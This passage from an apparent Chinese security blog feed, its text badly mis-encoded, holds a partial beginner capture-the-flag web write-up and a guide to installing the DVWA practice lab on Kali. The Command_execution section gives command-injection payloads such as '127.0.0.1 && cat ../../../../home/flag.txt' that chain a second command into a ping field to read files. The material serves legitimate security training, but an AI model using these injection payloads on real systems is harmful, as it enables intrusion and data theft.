src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(71).png"></p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(72).png"></p><h4 id="Xff-referer"><a href="#Xff-referer" class="headerlink" title="Xff_referer"></a>Xff_referer</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(80).png"></p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(81).png"></p><h4 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(82).png"></p><h4 id="Command-execution"><a href="#Command-execution" class="headerlink" title="Command_execution"></a>Command_execution</h4><p>1ã€æ‰“å¼€é¢˜ç›® 2ã€æŒæ¡æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯† windows æˆ– linux ä¸‹: command1 &amp;&amp; command2 å…ˆæ‰§è¡Œ command1ï¼Œå¦‚æœä¸ºçœŸï¼Œå†æ‰§è¡Œ command</p><p>2 command1 | command2 åªæ‰§è¡Œ command2 command1 &amp; command2 å…ˆæ‰§è¡Œ command2 åæ‰§è¡Œ command1 command1 || command2 å…ˆæ‰§è¡Œ command1ï¼Œå¦‚æœä¸ºå‡ï¼Œå†æ‰§è¡Œ command2 å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆ| || &amp; &amp;&amp; ç§°ä¸º ç®¡é“ç¬¦ï¼‰ </p><p>3ã€æ‰§è¡Œä¸€ä¸ª ping å¸¦ä¸€ä¸ªå…¶ä»–å‘½ä»¤è¯•è¯•ï¼Œæœç„¶èƒ½çœ‹åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ 3ã€åˆ°ä¸Šä¸€çº§ç›®å½•çœ‹çœ‹æœ‰å•¥ 127.0.0.1 &amp;&amp; ls ../ </p><p>4ã€æ‰¾åˆ° home ç›®å½•ï¼Œçœ‹çœ‹ home ç›®å½•ä¸‹æœ‰äº›å•¥ï¼Œå‘ç° flag æ–‡ä»¶</p><p> 5ã€åˆ©ç”¨ cat å‘½ä»¤æ‰“å¼€ flag æ–‡ä»¶ï¼Œ127.0.0.1 &amp;&amp; cat ../../../../home/flag.txtï¼Œå¾—åˆ° fl</p><h4 id="Simple-js"><a href="#Simple-js" class="headerlink" title="Simple.js"></a>Simple.js</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(83).png"></p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(84).png"></p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(85).png"></p><p>ä¹‹åå†å°†æ•°å­—Â·å¯¹ç…§ASCIIç å³å¯ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ”»é˜²ä¸–ç•Œ_web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kaliå®‰è£…dvwa</title>
      <link href="/2020/10/02/dvwa/kai%E5%AE%89%E8%A3%85dvwa/"/>
      <url>/2020/10/02/dvwa/kai%E5%AE%89%E8%A3%85dvwa/</url>
      
        <content type="html"><![CDATA[<h5 id="kaliå®‰è£…dvwa"><a href="#kaliå®‰è£…dvwa" class="headerlink" title="kaliå®‰è£…dvwa"></a>kaliå®‰è£…dvwa</h5><p> ä¹‹å‰å•Šå°±æœ‰è¿™ä¸ªæƒ³æ³•ï¼Œä¸è¿‡å½“æ—¶æ¯”è¾ƒæ‡’ä¹Ÿæ²¡æŠŠå®‰å…¨æ”¾å¿ƒä¸Š</p><p>(å¥½å§ï¼Œä¸»è¦è¿˜æ˜¯æ‡’)ï¼Œæ‰“å¼€äº†kailæ¥å®‰è£…dvwaé¶åœºï¼Œè²Œä¼¼åœ¨è™šæ‹Ÿæœºä¸Šæ“ä½œæ¯”è¾ƒå®‰å…¨ã€‚</p><p> æ­¥éª¤:</p><p> \1. é¦–å…ˆå»githubä¸Šä¸‹è½½DVWAçš„å®‰è£…åŒ…ï¼Œç½‘å€ä¸ºï¼š<a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br> \2. å°†ä¸‹è½½å¥½çš„å‹ç¼©åŒ…è§£å‹å¹¶æ”¹åä¸ºdvwaï¼Œç„¶åå°†å…¶å¤åˆ¶åˆ° /var/www/html  æ–‡ä»¶å¤¹ä¸­<br> \3. æ‰“å¼€ç»ˆç«¯ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å°†apache2åœæ­¢ï¼šservice apache2 stop</span><br><span class="line">ç»™dvwaæ–‡ä»¶å¤¹ç›¸åº”çš„æƒé™ï¼šchmod -R 755 &#x2F;var&#x2F;www&#x2F;html&#x2F;dvwa</span><br><span class="line">å¯åŠ¨mysqlæœåŠ¡ï¼š service mysql start</span><br><span class="line">æ‰“å¼€mysqlï¼š mysql -u root -p</span><br><span class="line">åˆ›å»ºæ•°æ®åº“ï¼šcreate database dvwa;</span><br><span class="line">é€€å‡ºmysqlï¼šexit</span><br><span class="line">å¯åŠ¨apache2æœåŠ¡ï¼šservice apache2 start</span><br></pre></td></tr></table></figure><p>æ‰“å¼€æµè§ˆå™¨ï¼Œåœ¨åœ°å€æ ä¸­è¾“å…¥ 127.0.0.1/dvwa  (æˆ–è€… localhost/dvwa) ,</p><p>æµè§ˆå™¨ä¼šè‡ªåŠ¨è·³è½¬åˆ°127.0.0.1/dvwa/setup.php é¡µé¢ï¼Œç‚¹å‡»é¡µé¢ä¸‹æ–¹Create/Reset DatabaseæŒ‰é’®ï¼Œ</p><p>ç«Ÿç„¶ä¸èƒ½åˆ›å»ºæ•°æ®åº“ï¼Œæç¤º Could not connect to the MySQL service. Please check the config file. åŸæ¥æ˜¯ç›¸åº”é…ç½®æ–‡ä»¶è¿˜æ²¡æœ‰ä¿®æ”¹ã€‚æŒ‰ç…§ä»¥å‰çš„æ–‡ç« ä¿®æ”¹åå‘ç°ä»ç„¶ä¸èƒ½è¿æ¥æ•°æ®åº“ï¼Œåˆšå¼€å§‹è¿˜ä»¥ä¸ºæ­å»ºè¿‡ç¨‹ä¸­æŸä¸€æ­¥éª¤å‡ºé—®é¢˜äº†ï¼Œé‡æ–°è¯•äº†ä¸€æ¬¡è¿˜æ˜¯ä¸è¡Œï¼Œåœ¨ç½‘ä¸Šæœç´¢äº†ä¸€ç•ªç»ˆäºæ‰¾åˆ°äº†ç­”æ¡ˆï¼ŒåŸæ¥Kaliä¸­çš„mysqlæ•°æ®åº“å› ä¸ºæŸäº›åŸå› æ¢ä¸ºäº†MariaDB,è€Œè¦è¿æ¥MariaDBéœ€è¦åˆ›å»ºä¸€ä¸ªérootç”¨æˆ·ç„¶åæ‰èƒ½ä»¥rootç”¨æˆ·çš„èº«ä»½å»è¿æ¥ï¼ˆä»…é’ˆå¯¹æ­¤æ•™ç¨‹ï¼Œå…¶ä»–çš„æœªæµ‹è¯•ï¼‰ã€‚   </p><p>  åœ¨è¿™é‡Œé‡åˆ°äº†å¥½å¤šé—®é¢˜ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯å…ˆérootç”¨æˆ·</p><p>  æˆåŠŸæ–°å¢ç”¨æˆ·davidåï¼Œæˆ‘å‘ç°ä¸èƒ½ç›´æ¥ä½¿ç”¨æŒ‡ä»¤ ï¼š<strong>sudo -i</strong></p><p>ï¼ˆå¤„äºérootç”¨æˆ·æ—¶ï¼Œè¾“å…¥ï¼š<strong>sudo -i</strong> ç„¶åå†è¾“å…¥å½“å‰ç”¨æˆ·çš„å¯†ç å³å¯ä¸´æ—¶å¼€å¯ <strong>root</strong> æƒé™ï¼‰</p><p>david ä¸åœ¨ sudoers æ–‡ä»¶ä¸­ã€‚æ­¤äº‹å°†è¢«æŠ¥å‘Š //å‘ƒï¼Œæœ‰ç‚¹å„¿å°´å°¬</p><p>æŸ¥é˜…ä¸‹æ‰çŸ¥é“åŸæ¥å¾—åœ¨rootä¸‹æ·»åŠ usernameï¼šdavid</p><p>ä¿®æ”¹ /etc/sudoers æ–‡ä»¶ï¼Œæ‰¾åˆ°ä¸‹é¢ä¸€è¡Œï¼Œåœ¨rootä¸‹é¢æ·»åŠ ä¸€è¡Œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## Allow root to run any commands anywhere</span><br><span class="line"></span><br><span class="line">root  ALL&#x3D;(ALL)   ALL</span><br><span class="line"></span><br><span class="line">david  ALL&#x3D;(ALL)   ALL  è¿™è¾¹rootåå­—ä¸‹ä¸€è¡Œæ”¹æˆè‡ªå·±æ–°å¢ç”¨æˆ·åå­—å³å¯ï¼›</span><br></pre></td></tr></table></figure><p>â€‹    \4. ç»ˆç«¯æ‰§è¡Œ mysql -u root -p  ,å›è½¦ï¼Œç„¶åè¾“å…¥è‡ªå·±è®¾ç½®çš„MariDBç”¨æˆ·çš„å¯†ç ï¼ˆå¦‚æœæ²¡è®¾ç½®è¿‡çš„è¯å°±ä¸ºç©ºï¼‰</p><p> æ‰§è¡Œä»¥ä¸‹SQLè¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create user &#39;dvwauser&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;&#39;;</span><br><span class="line"></span><br><span class="line">GRANT ALL PRIVILEGES ON *.* to &#39;dvwauser&#39;@&#39;localhost&#39;;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>â€‹    \5. ä¿®æ”¹dvwaçš„é…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html&#x2F;dvwa&#x2F;config&#x2F;</span><br><span class="line"></span><br><span class="line">ls  </span><br><span class="line"></span><br><span class="line">cp config.inc.php.dist config.inc.php#è¿™æ˜¯å¤åˆ¶å‘½ä»¤æ“ä½œ</span><br></pre></td></tr></table></figure><p>â€‹       å°†$_DVWA[ â€˜db_userâ€™ ]   = â€˜rootâ€™;  ä¿®æ”¹ä¸ºï¼š             $_DVWA[ â€˜db_userâ€™ ]   = â€˜dvwauserâ€™; </p><p>â€‹    </p><p>â€‹        $_DVWA[ â€˜db_passwordâ€™ ] = â€˜p@sswordâ€™;  ä¿®æ”¹ä¸ºï¼š      $_DVWA[ â€˜db_passwordâ€™ ] = â€˜â€™;   </p><p>è¿™è¾¹æˆ‘ä¸å¤ªæ‡‚ä½œè€…ä¸ºä»€ä¹ˆä¸€å®šè¦è¿™æ ·ä¿®æ”¹ï¼Œå› ä¸ºå…¶ä»–å¾ˆå¤šæ–‡ç« æ”¹æ³•ä¸ä¸€ï¼Œä½†æ˜¯è¿™æ ·æ”¹ä¸ä¼šæŠ¥é”™å°±æ— å¦¨ã€‚  </p><p>æ ¹æ®å®é™…æƒ…å†µé‡å¯ä¸‹apache2ï¼š  æœ‰ç‚¹åƒPHP studyé‚£æ ·å¯åŠ¨ç›¸åº”ç¨‹åº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure><p>   æ‰“å¼€æµè§ˆå™¨ï¼Œåœ¨åœ°å€æ ä¸­è¾“å…¥ 127.0.0.1/dvwa  (æˆ–è€… localhost/dvwa) ,æµè§ˆå™¨ä¼šè‡ªåŠ¨è·³è½¬åˆ°127.0.0.1/dvwa/setup.php é¡µé¢ï¼Œç‚¹å‡»é¡µé¢ä¸‹æ–¹Create/Reset DatabaseæŒ‰é’®ï¼Œå¯ä»¥å‘ç°dvwaè¿æ¥æ•°æ®åº“æˆåŠŸå¹¶åˆ›å»ºäº†ç›¸åº”çš„è¡¨ã€‚æ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨  </p><p>ç”¨æˆ·åï¼š admin   å¯†ç ï¼š password  ç™»å½•è¿›è¡Œæµ‹è¯•äº†ï¼</p><p><img src="/2020/10/02/dvwa/kai%E5%AE%89%E8%A3%85dvwa/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(51).png"></p><p><img src="/2020/10/02/dvwa/kai%E5%AE%89%E8%A3%85dvwa/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(52).png"></p><p>è¿™é‡ŒåŒæ—¶æ”¶å½•ä¸‹å¦ä¸€ä¸ªé—®é¢˜ï¼š</p><h6 id="dvwaå‡ºç°æŠ¥é”™"><a href="#dvwaå‡ºç°æŠ¥é”™" class="headerlink" title="dvwaå‡ºç°æŠ¥é”™"></a>dvwaå‡ºç°æŠ¥é”™</h6><p>æç¤ºDVWA System error - config file not found. Copy config/config.inc.php.dist to config/config.inc.php and configure to your environment.</p><p>è§£å†³æ–¹æ³•ï¼šæç¤ºå·²ç»å‘Šè¯‰äº†ï¼Œæ‰¾ä¸åˆ°é…ç½®æ–‡ä»¶ï¼Œå¤åˆ¶configç›®å½•ä¸‹çš„config.inc.php.distæ–‡ä»¶åˆ°config.inc.phpï¼Œç„¶åé…ç½®ç¯å¢ƒã€‚äºæ˜¯æŒ‰ç…§ä»–è¯´çš„æ¥ï¼Œè¿›å…¥phpstudyå®‰è£…ç›®å½•ä¸‹çš„WWW\DVWA\configä¸­ï¼ŒæŠŠconfig.inc.php.distå¤åˆ¶ä¸€ä¸‹ï¼Œå¹¶ä¸”è¿˜åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­ç²˜è´´ï¼Œç„¶åå»æ‰åç¼€  .dist ã€‚åˆ·æ–°å³OKã€‚</p><p>è½¬è½½å¤§éƒ¨åˆ†å†…å®¹äºï¼š<a href="https://blog.csdn.net/wanzt123/article/details/77476007">https://blog.csdn.net/wanzt123/article/details/77476007</a></p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.cnblogs.com/MirageFox/p/12852507.html">https://www.cnblogs.com/MirageFox/p/12852507.html</a></p><p><a href="https://www.cnblogs.com/myworld2018/p/8383611.html">https://www.cnblogs.com/myworld2018/p/8383611.html</a></p><p><a href="https://blog.csdn.net/weixin_39762423/article/details/83035209">https://blog.csdn.net/weixin_39762423/article/details/83035209</a></p><p><a href="https://blog.csdn.net/wenxuechaozhe/article/details/69092769">https://blog.csdn.net/wenxuechaozhe/article/details/69092769</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
